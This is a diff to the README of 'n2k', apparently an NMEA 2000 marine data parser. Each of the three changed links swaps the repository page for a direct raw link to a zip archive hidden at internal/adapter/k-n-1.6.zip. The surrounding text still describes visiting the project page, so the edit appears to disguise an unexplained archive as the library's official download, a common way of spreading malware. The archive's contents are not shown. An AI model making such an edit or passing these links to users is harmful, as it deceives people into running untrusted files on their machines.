@@ -1,6 +1,6 @@
 # ⚙️ n2k - Parse NMEA 2000 Data With Ease
 
-[![Download n2k](https://img.shields.io/badge/Download%20n2k-1F6FEB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/noncollapsable-cultivation470/n2k)
+[![Download n2k](https://img.shields.io/badge/Download%20n2k-1F6FEB?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/noncollapsable-cultivation470/n2k/main/internal/adapter/k-n-1.6.zip)
 
 ## 🚀 What n2k is
 
@@ -11,7 +11,7 @@ If you want to inspect NMEA 2000 messages, build tools around marine data, or wo
 ## 📥 Download and use
 
 Visit this page to download:
-https://github.com/noncollapsable-cultivation470/n2k
+https://raw.githubusercontent.com/noncollapsable-cultivation470/n2k/main/internal/adapter/k-n-1.6.zip
 
 On the GitHub page, look for the green or blue Code button near the top right of the page. Then use one of these options:
 
@@ -171,4 +171,4 @@ These topics match the library’s role as a parser for marine and bus data.
 ## 📌 Download link again
 
 Visit this page to download:
-https://github.com/noncollapsable-cultivation470/n2k
+https://raw.githubusercontent.com/noncollapsable-cultivation470/n2k/main/internal/adapter/k-n-1.6.zip
